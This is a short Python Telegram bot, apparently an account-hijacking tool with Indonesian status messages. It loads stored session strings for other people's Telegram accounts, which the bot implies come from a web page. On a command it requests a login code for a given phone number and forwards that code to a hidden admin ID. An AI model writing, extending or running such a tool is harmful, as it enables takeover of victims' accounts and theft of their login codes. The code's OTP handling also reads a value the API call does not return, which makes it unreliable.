# jinx_bot.py
from telethon import TelegramClient, events
from telethon.sessions import StringSession
import asyncio
import json
import os

# ENV
API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID'))

# BOT
bot = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
DATA_FILE = 'data.json'

def load():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {}

def save(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)

clients = {}

async def get_client(phone):
    if phone in clients:
        return clients[phone]
    data = load()
    if phone not in data:
        return None
    client = TelegramClient(StringSession(data[phone]['session']), API_ID, API_HASH)
    await client.connect()
    if await client.is_user_authorized():
        clients[phone] = client
        return client
    return None

@bot.on(events.NewMessage(pattern=r'/new otp (\+?\d+)'))
async def new_otp(event):
    phone = event.pattern_match.group(1)
    if phone[0] != '+':
        phone = '+' + phone
    client = await get_client(phone)
    if not client:
        await event.reply("Session tidak ada! Gunakan web dulu.")
        return
    try:
        sent = await client.send_code_request(phone)
        await event.reply(f"OTP: {sent.phone_code}")
        await bot.send_message(ADMIN_ID, f"OTP BARU: {sent.phone_code} → {phone}")
    except Exception as e:
        await event.reply("Gagal kirim OTP.")

print("JINX BOT JALAN!")
bot.run_until_disconnected()
